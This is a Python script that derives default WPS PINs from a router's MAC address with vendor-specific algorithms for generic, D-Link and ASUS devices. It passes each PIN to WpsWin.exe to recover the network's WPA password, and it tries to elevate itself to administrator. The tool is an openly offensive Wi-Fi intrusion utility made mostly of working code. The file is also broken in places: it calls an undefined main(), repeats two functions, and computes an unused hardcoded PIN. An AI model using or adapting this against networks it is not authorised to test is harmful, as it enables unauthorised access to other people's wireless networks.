import subprocess
import sys
import ctypes, sys
from time import sleep
from math import floor

MAC = 'C46E1F6A8D04'
One = Two = (int(MAC, 16) & 0xFFFFFF) % 10000000
Var1 = 0
while Two:
    Var1 += 3 * (Two % 10)
    Two = floor(Two / 10)
    Var1 += Two % 10
    Two = floor(Two / 10)
Var2 = (One * 10) + ((10 - (Var1 % 10)) % 10)
Var3 = str(int(Var2))
result = Var3.zfill(8)

if ctypes.windll.shell32.IsUserAnAdmin():
    if __name__ == "__main__":
        main()
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)

def checksum(mac):
    mac %= 10000000
    var = 0
    temp = mac
    while temp:
        var += 3 * (temp % 10)
        temp = floor(temp / 10)
        var += temp % 10
        temp = floor(temp / 10)
    return (mac * 10) + ((10 - (var % 10)) % 10)

def pin24(BSSID):
    temp = int(BSSID,16) & 0xFFFFFF
    temp = checksum(temp)
    temp = str(int(temp))
    return temp.zfill(8)

def pinDLink(BSSID):
    temp = (int(BSSID, 16) & 0xFFFFFF) ^ 0x55AA55
    temp ^= ((temp & 0xF) << 4) | ((temp & 0xF) << 8) | ((temp & 0xF) << 12) | ((temp & 0xF) << 16) | ((temp & 0xF) << 20)
    temp %= 10000000
    if temp < 1000000:
        temp += ((temp % 9) * 1000000) + 1000000
    temp = checksum(temp)
    temp = str(int(temp))
    return temp.zfill(8)

def pinDLinkInc1(BSSID):
    temp = int(BSSID, 16) + 1
    return pinDLink(hex(temp))

def pinASUS(BSSID):
    temp = format(int(BSSID, 16), '02x')
    temp = str(temp).zfill(12)
    var = [int(temp[0:2], 16), int(temp[2:4], 16), int(temp[4:6], 16), int(temp[6:8], 16),
        int(temp[8:10], 16), int(temp[10:12], 16)]
    pin = []
    for i in range(7):
        pin.append((var[i % 6] + var[5]) % (10 - ((i + var[1] + var[2] + var[3] + var[4] + var[5]) % 7)))
    temp = int(''.join(str(i) for i in pin))
    temp = checksum(temp)
    temp = str(int(temp))
    return temp.zfill(8)

def run_command(cmd):
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    for LINE in iter(p.stdout.readline, b''):
        if LINE:
            yield LINE
    while p.poll() is None:
        sleep(.1)
    err = p.stderr.read()
    if p.returncode != 0:
        print ("" + err)

def connect(ESSID, PIN):
    cmd = 'WpsWin.exe Action=Registrar ESSID="%s" PIN=%s' % (ESSID, str(PIN))
    sleep(1)
    for LINE in run_command(cmd):
        LINE = LINE.decode('cp866')
        if "Asociacion fallida" in LINE:
            print ("Connection with %s hasn't been established!" % ESSID)
            return
        elif "Pin incorrecto" in LINE:
            print("Pin invalid!")
            return
        elif "Wpa Key" in LINE:
            print("\nTRUE PIN FOUND!\nGetting the Wi-Fi password...\n")
            print(LINE)
            sleep(5)
            input()
            sys.exit()

def run_command(cmd):
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    for LINE in iter(p.stdout.readline, b''):
        if LINE:
            yield LINE
    while p.poll() is None:
        sleep(.1)
        err = p.stderr.read()
    if p.returncode != 0:
        print ("" + err)

def connect(ESSID, PIN):
    cmd = 'WpsWin.exe Action=Registrar ESSID="%s" PIN=%s' % (ESSID, str(PIN))
    sleep(1)
    for LINE in run_command(cmd):
        LINE = LINE.decode('cp866')
        if "Asociacion fallida" in LINE:
            print ("Connection with %s hasn't been established!" % ESSID)
            return
        elif "Pin incorrecto" in LINE:
            print("Pin invalid!")
            return
        elif "Wpa Key" in LINE:
            print("\nTRUE PIN FOUND!\nGetting the Wi-Fi password...\n")
            print(LINE)
            sleep(5)
            input()
            sys.exit()